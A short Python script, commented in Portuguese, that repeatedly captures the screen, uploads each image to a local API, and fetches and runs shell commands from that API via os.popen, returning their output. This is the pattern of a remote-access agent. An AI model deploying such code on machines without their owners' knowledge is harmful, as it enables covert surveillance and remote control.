import time
import pyautogui
import requests
from io import BytesIO
import os

# Função para capturar a tela
def capture_screen():
    screenshot = pyautogui.screenshot()
    return screenshot

# Função para enviar a imagem para a API
def send_to_api(image, ip):
    url = f'http://localhost:3000/upload/{ip}'  # URL para enviar o screenshot para a API com o IP específico
    files = {'file': ('screenshot.png', image, 'image/png')}
    response = requests.post(url, files=files)
    if response.status_code == 200:
        print('Screenshot enviado com sucesso para a API.')
    else:
        print('Erro ao enviar screenshot para a API.')

# Função para obter um novo IP da API
def get_new_ip():
    response = requests.get('http://localhost:3000/new-ip')
    if response.status_code == 200:
        return response.json()['ip']
    else:
        print('Erro ao obter novo IP da API.')
        return None

# Função para enviar um comando para a API
def send_command_to_api(command):
    url = 'http://localhost:3000/send-command'
    response = requests.post(url, json={'cmd': command})
    if response.status_code == 200:
        print('Comando enviado com sucesso para a API.')
    else:
        print('Erro ao enviar comando para a API.')

# Função para receber o resultado da execução da API
def receive_result_from_api(result):
    url = 'http://localhost:3000/receive-result'
    response = requests.post(url, json={'result': result})
    if response.status_code == 200:
        print('Resultado recebido com sucesso pela API.')
    else:
        print('Erro ao receber resultado pela API.')

# Obter um novo IP da API
user_ip = get_new_ip()
if not user_ip:
    print('Não foi possível obter um IP. Encerrando o script.')
    exit()

# Loop para capturar a tela e enviar para a API continuamente
while True:
    try:
        # Captura a tela
        screen = capture_screen()
        
        # Salva a captura de tela em um objeto de memória
        image_buffer = BytesIO()
        screen.save(image_buffer, format='PNG')
        image_buffer.seek(0)
        
        # Envia a imagem para a API
        send_to_api(image_buffer, user_ip)
        
        # Obtém o próximo comando a ser executado da API
        response = requests.get('http://localhost:3000/get-command')
        if response.status_code == 200:
            command = response.text
            if command:
                # Executa o comando e envia o resultado para a API
                print('Executando comando:', command)
                result = os.popen(command).read()  # Executa o comando e obtém o resultado
                receive_result_from_api(result)
        
        # Espera 5 segundos antes de capturar a próxima tela
        time.sleep(2)
        
    except KeyboardInterrupt:
        print('Script interrompido.')
        break
